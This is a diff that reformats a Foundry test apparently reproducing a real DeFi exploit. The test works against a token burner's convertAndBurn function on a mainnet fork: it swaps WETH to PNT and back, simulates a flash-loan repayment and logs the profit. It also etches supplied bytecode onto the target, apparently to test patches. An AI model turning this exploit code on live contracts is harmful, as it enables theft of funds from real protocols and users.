@@ -7,12 +7,9 @@ import "./../interface.sol";
 // Attack Tx : https://etherscan.io/tx/0x3bba4fb6de00dd38df3ad68e51c19fe575a95a296e0632028f101c5199b6f714
 
 // @Info
- 
 
 interface IBurner is IERC20 {
-    function convertAndBurn(
-        address[] calldata tokens
-    ) external;
+    function convertAndBurn(address[] calldata tokens) external;
 }
 
 contract ContractTest is Test {
@@ -20,16 +17,19 @@ contract ContractTest is Test {
     IERC20 usdt_ = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
     IERC20 wbtc_ = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);
     IERC20 pnt_ = IERC20(0x89Ab32156e46F46D02ade3FEcbe5Fc4243B9AAeD);
-    IWETH weth_ = IWETH(payable(address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2)));
+    IWETH weth_ =
+        IWETH(payable(address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2)));
 
-    IUniswapV2Router router_ = IUniswapV2Router(payable(address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D)));
+    IUniswapV2Router router_ =
+        IUniswapV2Router(
+            payable(address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D))
+        );
 
     function setUp() public {
         vm.createSelectFork("mainnet", 19_917_290);
         string memory bytecodePath = vm.envString("BYTECODE_PATH");
-        bytes memory newRuntimeBytecode=vm.readFileBinary(bytecodePath);
-        vm.etch(address(burner_),newRuntimeBytecode);
-
+        bytes memory newRuntimeBytecode = vm.readFileBinary(bytecodePath);
+        vm.etch(address(burner_), newRuntimeBytecode);
 
         vm.deal(address(this), 0);
     }
@@ -44,7 +44,11 @@ contract ContractTest is Test {
         path[0] = address(weth_);
         path[1] = address(pnt_);
         router_.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            weth_.balanceOf(address(this)), 0, path, address(this), block.timestamp
+            weth_.balanceOf(address(this)),
+            0,
+            path,
+            address(this),
+            block.timestamp
         );
 
         console.log("=== ACK START ===");
@@ -58,10 +62,18 @@ contract ContractTest is Test {
         path[0] = address(pnt_);
         path[1] = address(weth_);
         router_.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            pnt_.balanceOf(address(this)), 0, path, address(this), block.timestamp
+            pnt_.balanceOf(address(this)),
+            0,
+            path,
+            address(this),
+            block.timestamp
         );
 
         weth_.transfer(address(0x01), 70 ether); // simulation repay flashloan
-        emit log_named_decimal_uint("profit weth = ", weth_.balanceOf(address(this)), 18);
+        emit log_named_decimal_uint(
+            "profit weth = ",
+            weth_.balanceOf(address(this)),
+            18
+        );
     }
 }
